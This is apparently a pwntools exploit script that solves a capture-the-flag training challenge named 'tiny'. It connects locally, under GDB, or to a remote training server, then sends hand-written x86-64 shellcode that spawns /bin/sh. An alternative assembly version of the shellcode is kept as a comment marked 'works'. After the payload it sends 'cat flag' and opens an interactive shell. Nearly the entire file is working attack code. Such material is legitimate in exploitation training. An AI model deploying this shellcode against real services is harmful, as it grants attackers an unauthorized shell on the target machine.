from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
COMMANDS = """
b *0x401B9E
c
"""

#b *0x4019A2
context.arch = "amd64"

if args.REMOTE:
    c = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./tiny", gdbscript = COMMANDS) 
    else:
        c= process("./tiny")
        
earlierpayload = b"\x48\x92\x31\xFF\x48\x97"
incedi = b"\xFF\xC7" * 5
latestpayload = b"\x31\xF6\x31\xD2\x31\xC0\xB0\x3B\x0F\x05/bin/sh\0"

shellcode = b"\x90\x48\x92\x04\x13\x31\xFF\x48\x97\x31\xF6\x31\xD2\x31\xC0\xB0\x3B\x0F\x05/bin/sh\0" #works

# shellcode = asm("""
# nop
# xchg   rdx,rax
# add    al,0x13
# xor    edi,edi
# xchg   rdi,rax
# xor    esi,esi
# xor    edx,edx
# xor    eax,eax
# mov    al,0x3b
# syscall
# """) + b"/bin/sh\0" # works
c.sendline(shellcode)
c.sendline("cat flag")
c.interactive()
